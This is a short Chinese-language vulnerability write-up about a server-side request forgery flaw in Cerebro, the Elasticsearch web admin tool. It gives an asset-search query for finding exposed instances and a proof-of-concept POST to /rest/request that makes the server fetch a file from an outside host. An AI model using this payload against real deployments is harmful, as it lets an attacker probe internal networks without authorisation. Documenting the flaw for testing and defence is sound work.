# Cerebro request SSRF漏洞

## 漏洞描述

Cerebro是使用Scala、Play Framework、AngularJS和Bootstrap构建的开源的基于Elasticsearch Web可视化管理工具。您可以通过Cerebro对集群进行web可视化管理，如执行rest请求、修改Elasticsearch配置、监控实时的磁盘，集群负载，内存使用率等。其中某功能存在SSRF漏洞，攻击者通过发送特定的请求包可以探测内网信息

## 漏洞影响

<a-checkbox checked>Cerebro</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="Cerebro"</a-checkbox></br>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1643621805930-c98b1f7a-e9b0-452d-b4b1-0ac1e99f7084.png)

发送请求包

```go
POST /rest/request

{"method":"GET","data":"","path":"robots.txt","host":"https://www.baidu.com"}
```

![img](../../../.vuepress/public/img/1643622217572-65a71fc9-e87d-4c76-8848-515c854ea959.png)